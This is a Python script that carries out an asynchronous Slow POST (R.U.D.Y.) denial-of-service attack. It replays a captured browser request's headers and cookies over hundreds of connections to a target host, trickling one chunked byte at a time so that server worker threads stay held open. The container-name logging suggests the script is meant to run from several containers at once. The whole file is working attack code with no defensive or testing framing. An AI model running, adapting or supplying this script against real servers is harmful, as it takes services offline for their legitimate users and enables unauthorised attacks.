#!/usr/bin/env python3
"""
slowpost.py — Async R.U.D.Y. (Slow POST) attack.
Each coroutine holds a server worker thread by announcing a large POST body
and trickling 1 byte at a time using chunked transfer encoding.
Uses full browser headers/cookies from captured request.
"""

import asyncio
import time
import sys
import os

from request_loader import load_request_data, build_cookie_header

REQ = load_request_data()
TARGET_HOST = REQ["host"]
TARGET_PORT = REQ["port"]

DRIP_INTERVAL = 0.5
CONNECT_TIMEOUT = 15
RECONNECT_DELAY = 5

NUM_CONNECTIONS = int(sys.argv[1]) if len(sys.argv) > 1 else 500
CONTAINER_NAME = os.environ.get("CONTAINER_NAME", "instance-1")

active_slots = 0
total_connects = 0
total_errors = 0
lock = asyncio.Lock()


async def slow_post_worker(cid: int):
    global active_slots, total_connects, total_errors

    while True:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET_HOST, TARGET_PORT),
                timeout=CONNECT_TIMEOUT,
            )

            async with lock:
                active_slots += 1
                total_connects += 1

            headers = f"POST {REQ['path']} HTTP/1.1\r\n"
            for k, v in REQ["headers"].items():
                if k.lower() in ("content-length", "transfer-encoding"):
                    continue
                headers += f"{k}: {v}\r\n"
            cookie_str = build_cookie_header(REQ["cookies"])
            if cookie_str and "Cookie" not in REQ["headers"]:
                headers += f"Cookie: {cookie_str}\r\n"
            headers += "Transfer-Encoding: chunked\r\n"
            headers += "\r\n"

            writer.write(headers.encode())
            await writer.drain()

            while True:
                await asyncio.sleep(DRIP_INTERVAL)
                writer.write(b"1\r\nA\r\n")
                await writer.drain()

        except Exception:
            async with lock:
                total_errors += 1
                if active_slots > 0:
                    active_slots -= 1
            await asyncio.sleep(RECONNECT_DELAY)

        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass


async def status_reporter():
    start = time.time()
    while True:
        await asyncio.sleep(30)
        elapsed = int(time.time() - start)
        print(
            f"[{CONTAINER_NAME}] T+{elapsed}s | "
            f"slots={active_slots}/{NUM_CONNECTIONS} | "
            f"connects={total_connects} | errors={total_errors}",
            flush=True,
        )


async def main():
    print(f"[{CONTAINER_NAME}] Async Slow POST — {NUM_CONNECTIONS} coroutines", flush=True)
    print(f"[{CONTAINER_NAME}] Target: {TARGET_HOST}:{TARGET_PORT}{REQ['path']}", flush=True)
    print(f"[{CONTAINER_NAME}] Headers: {len(REQ['headers'])} | Cookies: {len(REQ['cookies'])}", flush=True)

    tasks = []
    for i in range(NUM_CONNECTIONS):
        tasks.append(asyncio.create_task(slow_post_worker(i)))
        if i % 50 == 49:
            await asyncio.sleep(0.5)

    tasks.append(asyncio.create_task(status_reporter()))
    await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
